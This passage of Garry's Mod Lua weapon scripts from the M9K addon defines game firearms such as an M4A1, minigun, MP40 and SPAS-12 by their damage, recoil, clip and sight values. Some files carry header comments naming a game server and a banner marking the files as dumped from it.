 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

-- Variables that are used on both client and server
SWEP.Gun = ("m9k_m4a1") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then 
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Assault Rifles"
SWEP.Author				= "iron angles and models hexed and converted to gmod my Mr Fokkusu"
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "M4A1 Iron"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 33			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "ar2"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_m4a1_iron.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_m4a1_iron.mdl"	-- Weapon world model
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("Dmgfok_M4A1.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 800			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 30		-- Size of a clip
SWEP.Primary.DefaultClip		= 60		-- Bullets you start with
SWEP.Primary.KickUp				= 0.4		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.4		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.5		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "Rifle"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.SelectiveFire		= true

SWEP.Secondary.IronFOV			= 60		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 30	-- Base damage per bullet
SWEP.Primary.Spread		= .02	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .01 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector (2.4537, 1.0923, 0.2696)
SWEP.IronSightsAng = Vector (-0.0105, -0.0061, 0)
SWEP.SightsPos = Vector (2.4537, 1.0923, 0.2696)
SWEP.SightsAng = Vector (-0.0105, -0.0061, 0)
SWEP.RunSightsPos = Vector (-3.0328, 0, 1.888)
SWEP.RunSightsAng = Vector (-24.2146, -36.522, 10)

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/m9k/lua/weapons/m9k_minigun/shared.lua:
SWEP.Gun = ("m9k_minigun") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "GMB M9K Machine Guns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "M134 Minigun"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 3				-- Slot in the weapon selection menu
SWEP.SlotPos				= 37			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "crossbow"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 65
SWEP.ViewModelFlip			= false
SWEP.ViewModel				= "models/weapons/v_minigunvulcan.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_m134_minigun.mdl"	-- Weapon world model
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("BlackVulcan.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 3500			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 100		-- Size of a clip
SWEP.Primary.DefaultClip		= 200		-- Bullets you start with
SWEP.Primary.KickUp				= 0.15		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.2		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.2		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "ar2"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.Secondary.IronFOV			= 0		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 25	-- Base damage per bullet
SWEP.Primary.Spread		= .025	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .035 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.RunSightsPos = Vector(0, -11.148, -8.033)
SWEP.RunSightsAng = Vector(55.082, 0, 0)

if ((gmod.GetGamemode().Name) == "Murderthon 9000") or ((gmod.GetGamemode().Name) == "Murderthon 9000 beta") then
	SWEP.Primary.ClipSize			= 100		-- Size of a clip
	SWEP.Primary.DefaultClip		= 200		-- Bullets you start with
else
	SWEP.Primary.ClipSize			= 300		-- Size of a clip
	SWEP.Primary.DefaultClip		= 600		-- Bullets you start with
end

function SWEP:Reload()

	self.Weapon:DefaultReload(ACT_VM_RELOAD) 
	if !self.Owner:IsNPC() then
		self.ResetSights = CurTime() + self.Owner:GetViewModel():SequenceDuration() end
	if ( self.Weapon:Clip1() < self.Primary.ClipSize ) and !self.Owner:IsNPC() then
	-- When the current clip < full clip and the rest of your ammo > 0, then
		self.Owner:SetFOV( 0, 0.3 )
		-- Zoom = 0
		self:SetIronsights(false)
		-- Set the ironsight to false
		self.Weapon:SetNWBool("Reloading", true)
	end
	local waitdammit = (self.Owner:GetViewModel():SequenceDuration())
	self:MiniGunIdle(waitdammit)
end

function SWEP:MiniGunIdle(wait)
	timer.Simple(wait + .05, function()
	if IsValid(self.Weapon) then
	self.Weapon:SetNWBool("Reloading", false)
	if SERVER then 
		self.Weapon:SendWeaponAnim( ACT_VM_IDLE )
	else return end end
	end)
end

function SWEP:IronSight()

	if self.Owner:KeyDown(IN_SPEED) and not (self.Weapon:GetNWBool("Reloading")) then					// If you run then
	self.Weapon:SetNextPrimaryFire(CurTime()+0.5)				// Make it so you can't shoot for another quarter second
	self.IronSightsPos = self.RunSightsPos					// Hold it down
	self.IronSightsAng = self.RunSightsAng					// Hold it down
	self:SetIronsights(true, self.Owner)					// Set the ironsight true
	self.Owner:SetFOV( 0, 0.3 )						// Reset FOV
	end								

	if self.Owner:KeyReleased(IN_SPEED) then				// If you stop running then
	self:SetIronsights(false, self.Owner)					// Set the ironsight true
	self.Owner:SetFOV( 0, 0.3 )						// Reset FOV
	end

end

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/m9k/lua/weapons/m9k_mp40/shared.lua:
--[[
Server Name: Русский FastRP #1 [Быстрая загрузка][M9K]
Server IP:   37.230.137.126:27015
File Path:   addons/rp_wep/lua/weapons/m9k_mp40/shared.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

-- Variables that are used on both client and server
SWEP.Gun = ("m9k_mp40") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Submachine Guns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "MP40"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 50			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "smg"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 55
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_mp40smg.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_mp40smg.mdl"	-- Weapon world model
SWEP.ShowWorldModel			= true
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("mp40.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 500			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 32		-- Size of a clip
SWEP.Primary.DefaultClip		= 64		-- Bullets you start with
SWEP.Primary.KickUp				= 0.3		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.2		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.4		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "smg1"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.SelectiveFire		= true

SWEP.Secondary.IronFOV			= 55		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 25	-- Base damage per bullet
SWEP.Primary.Spread		= .022	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .015 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(3.881, 0.187, 1.626)
SWEP.IronSightsAng = Vector(-0.047, 0, 0)
SWEP.SightsPos = Vector(3.881, 0.187, 1.626)
SWEP.SightsAng = Vector(-0.047, 0, 0)
SWEP.RunSightsPos = Vector(-5.119, -4.173, 0.865)
SWEP.RunSightsAng = Vector(-9.094, -56.496, 0)

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/m9k/lua/weapons/m9k_mp7/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_mp7") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Submachine Guns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "HK MP7"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 48			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- Set false if you want no crosshair from hip
SWEP.Weight				= 50			-- Rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.XHair					= true		-- Used for returning crosshair after scope. Must be the same as DrawCrosshair
SWEP.BoltAction				= false		-- Is this a bolt action rifle?
SWEP.HoldType 				= "ar2"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_mp7_silenced.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_mp7_silenced.mdl"	-- Weapon world model
SWEP.Base 				= "bobs_scoped_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true

SWEP.Primary.Sound			= Sound("Weapon_MP7.single")		-- script that calls the primary fire sound
SWEP.Primary.RPM				= 950		-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 30		-- Size of a clip
SWEP.Primary.DefaultClip			= 60	-- Bullets you start with
SWEP.Primary.KickUp			= .2				-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= .2			-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal			= .1		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic/Semi Auto
SWEP.Primary.Ammo			= "smg1"	-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets
SWEP.SelectiveFire		= true

SWEP.Secondary.ScopeZoom			= 4	
SWEP.Secondary.UseACOG			= false -- Choose one scope type
SWEP.Secondary.UseMilDot		= false	-- I mean it, only one	
SWEP.Secondary.UseSVD			= false	-- If you choose more than one, your scope will not show up at all
SWEP.Secondary.UseParabolic		= false	
SWEP.Secondary.UseElcan			= false
SWEP.Secondary.UseGreenDuplex	= false
SWEP.Secondary.UseAimpoint		= true

SWEP.data 				= {}
SWEP.data.ironsights			= 1
SWEP.ScopeScale 			= 0.7

SWEP.Primary.NumShots	= 1		--how many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 19	--base damage per bullet
SWEP.Primary.Spread		= .001	--define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .001 -- ironsight accuracy, should be the same for shotguns

-- enter iron sight info and bone mod info below

SWEP.IronSightsPos = Vector (3, -5, 1.5)
SWEP.IronSightsAng = Vector (0, 0, 0)
SWEP.SightsPos = Vector (3, -5, 1.5)
SWEP.SightsAng = Vector (0, 0, 0)
SWEP.RunSightsPos = Vector (-3.1731, -5.3573, 1.4608)
SWEP.RunSightsAng = Vector (-18.7139, -48.1596, 0)

if (gmod.GetGamemode().Name == "Murderthon 9000") then

	SWEP.Slot		= 1				-- Slot in the weapon selection menu
	SWEP.Weight		= 3			-- rank relative ot other weapons. bigger is better

end

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/m9k/lua/weapons/m9k_remington870/shared.lua:
--[[
Server Name: Русский FastRP #1 [Быстрая загрузка][M9K]
Server IP:   37.230.137.126:27015
File Path:   addons/rp_wep/lua/weapons/m9k_remington870/shared.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

-- Variables that are used on both client and server
SWEP.Gun = ("m9k_remington870") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Shotguns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "Remington 870"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 3				-- Slot in the weapon selection menu
SWEP.SlotPos				= 26			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "shotgun"	-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= false
SWEP.ViewModel				= "models/weapons/v_rem870tactical.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_remington_870_tact.mdl"	-- Weapon world model
SWEP.Base 				= "bobs_shotty_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true

SWEP.Primary.Sound			= Sound("WepRem870.Single")		-- script that calls the primary fire sound
SWEP.Primary.RPM				= 60		-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 8			-- Size of a clip
SWEP.Primary.DefaultClip		= 30	-- Default number of bullets in a clip
SWEP.Primary.KickUp				= 1.25				-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.8		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.4	-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= false		-- Automatic/Semi Auto
SWEP.Primary.Ammo			= "Buckshot"	-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.Secondary.IronFOV			= 60		-- How much you 'zoom' in. Less is more! 

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.ShellTime			= .45

SWEP.Primary.NumShots	= 9		-- How many bullets to shoot per trigger pull, AKA pellets
SWEP.Primary.Damage		= 10	-- Base damage per bullet
SWEP.Primary.Spread		= .035	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .035	-- Ironsight accuracy, should be the same for shotguns
-- Because irons don't magically give you less pellet spread!

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(-2.014, 0.1, 1.2)
SWEP.IronSightsAng = Vector(0.551, 0.028, 0)
SWEP.SightsPos = Vector(-2.014, 0.1, 1.2)
SWEP.SightsAng = Vector(0.551, 0.028, 0)
SWEP.RunSightsPos = Vector(6.534, -4.646, 1.654)
SWEP.RunSightsAng = Vector(-19.567, 68.622, 0)


if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/m9k/lua/weapons/m9k_spas12/shared.lua:
--[[
Server Name: Русский FastRP #1 [Быстрая загрузка][M9K]
Server IP:   37.230.137.126:27015
File Path:   addons/rp_wep/lua/weapons/m9k_spas12/shared.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

-- Variables that are used on both client and server
SWEP.Gun = ("m9k_spas12") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Shotguns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "SPAS 12"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 3				-- Slot in the weapon selection menu
SWEP.SlotPos				= 27			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "shotgun"	-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_spas12_shot.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_spas_12.mdl"	-- Weapon world model
SWEP.Base 				= "bobs_shotty_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true

SWEP.Primary.Sound			= Sound("spas_12_shoty.Single")		-- script that calls the primary fire sound
SWEP.Primary.RPM				= 250		-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 8			-- Size of a clip
SWEP.Primary.DefaultClip		= 30	-- Default number of bullets in a clip
SWEP.Primary.KickUp				= 1.5				-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.3		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.7	-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= false		-- Automatic/Semi Auto
SWEP.Primary.Ammo			= "Buckshot"	-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.Secondary.IronFOV			= 60		-- How much you 'zoom' in. Less is more! 
SWEP.ShellTime			= .4

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 10		-- How many bullets to shoot per trigger pull, AKA pellets
SWEP.Primary.Damage		= 10	-- Base damage per bullet
SWEP.Primary.Spread		= .03	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .03	-- Ironsight accuracy, should be the same for shotguns
-- Because irons don't magically give you less pellet spread!

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(2.657, .394, 1.659)
SWEP.IronSightsAng = Vector(0, 0, 0)
SWEP.SightsPos = Vector(2.657, .394, 1.659)
SWEP.SightsAng = Vector(0, 0, 0)
SWEP.RunSightsPos = Vector(-3.116, -3.935, 0.492)
SWEP.RunSightsAng = Vector(-19.894, -47.624, 10.902)



if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
